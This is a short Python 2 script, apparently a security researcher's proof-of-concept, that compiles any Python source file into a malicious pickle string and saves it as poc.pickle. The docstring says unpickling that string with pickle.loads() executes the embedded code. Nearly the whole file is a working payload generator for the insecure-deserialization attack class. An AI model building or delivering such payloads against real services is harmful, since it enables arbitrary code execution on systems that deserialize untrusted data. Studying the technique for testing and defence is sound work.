# !/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'bit4'
__github__ = 'https://github.com/bit4woo'
__filename__ = 'pickle_poc_gen1.py'
#from https://gist.github.com/freddyb/3360650

try:
    import cPickle as pickle
except ImportError:
    import pickle

from sys import argv

def picklecompiler(sourcefile):
    """ 
    Usually pickle can only be used to (de)serialize objects.
    This tiny snippet will allow you to transform arbitrary python source
    code into a pickle string. Unpickling this string with pickle.loads()
    will execute the given soruce code.
    The trick is actually prettey easy: Usually eval() will only accept
    expressions, thus class and function declarations does not work.
    Using the work-around of code objects (returned by compile()), we can
    execute real python source code :)
    """
    sourcecode = file(sourcefile).read()
    payload = "c__builtin__\neval\n(c__builtin__\ncompile\n(%sS'<payload>'\nS'exec'\ntRtR." % (pickle.dumps( sourcecode )[:-4],)
    print payload
    fp =open("poc.pickle","w")
    fp.write(payload)


def usage():
    print "usage: ./%s file\n\nfile\tfile to compile into a pickle string" % argv[0]

if len(argv) == 2:
    print repr(picklecompiler(argv[1]))
else:
    usage()
